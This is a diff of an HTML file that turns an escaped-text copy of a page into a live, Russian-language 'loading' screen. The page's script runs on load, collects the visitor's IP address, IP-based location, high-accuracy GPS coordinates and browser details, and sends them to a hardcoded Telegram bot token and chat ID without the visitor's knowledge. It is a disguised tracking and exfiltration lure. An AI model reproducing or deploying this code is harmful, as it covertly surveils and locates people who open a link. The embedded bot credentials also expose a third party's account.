@@ -1,229 +1,106 @@
-﻿<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="ru">
 <head>
-	<title>be1.ru</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        .loader {
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-<p>&lt;!DOCTYPE html&gt;</p>
-
-<p>&lt;html lang=&quot;ru&quot;&gt;</p>
-
-<p>&lt;head&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;meta charset=&quot;UTF-8&quot;&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;title&gt;Загрузка...&lt;/title&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;style&gt;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; body {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; margin: 0;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; height: 100vh;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; display: flex;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; align-items: center;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; justify-content: center;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; background: #f5f5f5;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; font-family: Arial, sans-serif;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; color: #333;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; .loader {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text-align: center;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp; &nbsp; &lt;/style&gt;</p>
-
-<p>&lt;/head&gt;</p>
-
-<p>&lt;body&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;div class=&quot;loader&quot;&gt;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &lt;p&gt;⏳ Секунду...&lt;/p&gt;</p>
-
-<p>&nbsp; &nbsp; &lt;/div&gt;</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &lt;script&gt;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; // ========== НАСТРОЙКИ (замени на свои!) ==========</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; const TELEGRAM_BOT_TOKEN = &#39;7959565855:AAHcTfthk4ususxYw3hcipEiJxe_TdI_XFc&#39;; // получить у @BotFather</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; const TELEGRAM_CHAT_ID = &#39;1391249960&#39;; // узнать у @userinfobot</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; // =================================================</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; async function getIP() {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const res = await fetch(&#39;https://api.ipify.org?format=json&#39;);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const data = await res.json();</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return data.ip;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return &#39;неизвестен&#39;;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; async function getGeoByIP(ip) {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const res = await fetch(https://ipapi.co/${ip}/json/);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const d = await res.json();</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return d &amp;&amp; d.city ? ${d.city}, ${d.region}, ${d.country_name} : &#39;не определено&#39;;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return &#39;не определено&#39;;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; function getBrowserGeo() {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return new Promise((resolve) =&gt; {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!navigator.geolocation) return resolve(null);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; navigator.geolocation.getCurrentPosition(</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (pos) =&gt; resolve({</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lat: pos.coords.latitude.toFixed(5),</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lon: pos.coords.longitude.toFixed(5),</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; acc: pos.coords.accuracy ? ${Math.round(pos.coords.accuracy)} м : &#39;?&#39;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }),</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; () =&gt; resolve(null),</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; );</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; });</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; async function sendToTelegram(text) {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const url = https://api.telegram.org/bot${7959565855:AAHcTfthk4ususxYw3hcipEiJxe_TdI_XFc}/sendMessage;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; await fetch(url, {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; method: &#39;POST&#39;,</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; body: JSON.stringify({</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chat_id: 1391249960,</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text: text,</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; parse_mode: &#39;HTML&#39;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; })</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; });</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } catch (e) {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.error(&#39;Ошибка отправки в Telegram&#39;, e);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; (async function main() {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const ip = await getIP();</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const geoFromIP = await getGeoByIP(ip);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const browserGeo = await getBrowserGeo();</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; let geoText = 🌍 По IP: ${geoFromIP};</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (browserGeo) {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; geoText += \n📍 GPS: ${browserGeo.lat}, ${browserGeo.lon} (&plusmn;${browserGeo.acc});</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; geoText += \n⚠️ Точная геолокация не получена (возможно, запрет в браузере);</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; const message = 🕵️ Новый посетитель!\n\n +</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IP: &lt;code&gt;${ip}&lt;/code&gt;\n +</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${geoText}\n\n +</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 📱 Устройство: ${navigator.userAgent}\n +</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 🕒 Время: ${new Date().toLocaleString()};</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; await sendToTelegram(message);</p>
-
-<p>&nbsp;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // После отправки можно перенаправить на любой сайт (опционально)</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // window.location.href = &#39;https://google.com&#39;;</p>
-
-<p>&nbsp; &nbsp; &nbsp; &nbsp; })();</p>
-
-<p>&nbsp; &nbsp; &lt;/script&gt;</p>
-
-<p>&lt;/body&gt;</p>
-
-<p>&lt;/html&gt;</p>
+    <div class="loader">
+        <p>⏳ Секунду...</p>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7959565855:AANctTfhk4ususxYw3hcipEijxe_TdI_XFc';
+        const TELEGRAM_CHAT_ID = '1391249960';
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'неизвестен';
+            }
+        }
+
+        async function getGeoByIP(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const d = await res.json();
+                return d && d.city ? `${d.city}, ${d.region}, ${d.country_name}` : 'не определено';
+            } catch {
+                return 'не определено';
+            }
+        }
+
+        function getBrowserGeo() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude.toFixed(5),
+                        lon: pos.coords.longitude.toFixed(5),
+                        acc: pos.coords.accuracy ? `${Math.round(pos.coords.accuracy)} м` : '?'
+                    }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error('Ошибка отправки в Telegram', e);
+            }
+        }
+
+        (async function main() {
+            const ip = await getIP();
+            const geoFromIP = await getGeoByIP(ip);
+            const browserGeo = await getBrowserGeo();
+
+            let geoText = `🌍 По IP: ${geoFromIP}`;
+            if (browserGeo) {
+                geoText += `\n📍 GPS: ${browserGeo.lat}, ${browserGeo.lon} (±${browserGeo.acc})`;
+            } else {
+                geoText += `\n⚠️ Точная геолокация не получена`;
+            }
+
+            const message = `🕵️ Новый посетитель!\n\n` +
+                `IP: <code>${ip}</code>\n` +
+                `${geoText}\n\n` +
+                `📱 Устройство: ${navigator.userAgent}\n` +
+                `🕒 Время: ${new Date().toLocaleString()}`;
+
+            await sendToTelegram(message);
+        })();
+    </script>
 </body>
 </html>
